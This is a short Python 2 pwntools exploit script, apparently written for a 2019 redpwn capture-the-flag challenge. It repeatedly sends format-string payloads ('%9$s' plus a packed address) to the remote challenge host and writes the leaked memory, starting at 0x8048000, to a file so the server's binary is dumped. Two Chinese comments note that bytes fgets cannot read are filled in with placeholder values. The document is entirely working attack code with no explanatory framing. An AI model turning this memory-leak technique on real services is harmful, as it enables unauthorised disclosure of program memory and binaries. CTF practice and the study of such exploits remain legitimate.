# encoding: utf-8

from pwn import *
import binascii

r = remote("chall.2019.redpwn.net", 4007)
file = open('output', 'wb')

address = 0x8048000
leak = ''
lock = False
while True:
	try:
		print "address @ ", hex(address)
		payload = '%9$sABCD' + p32(address)
		if '\x00' in payload or '\x0a' in payload: # fgets 讀到 \x00 或 \x0a 會中止
			file.write('\xff')
			leak += '\xff' # 這是錯的值, 之後要自行修改
			address += 1
			continue

		r.sendline(payload)
		info = r.recvuntil('ABCD')[:-4]
		if lock:
			r.recvline()
		print "info = ", binascii.hexlify(info)
		print "len = ", len(info)
		file.write(info + '\x00')
		address += len(info) + 1
		leak += info + '\x00'
		print hexdump(leak)
		lock = True
	except:
		break

file.close()
r.close()
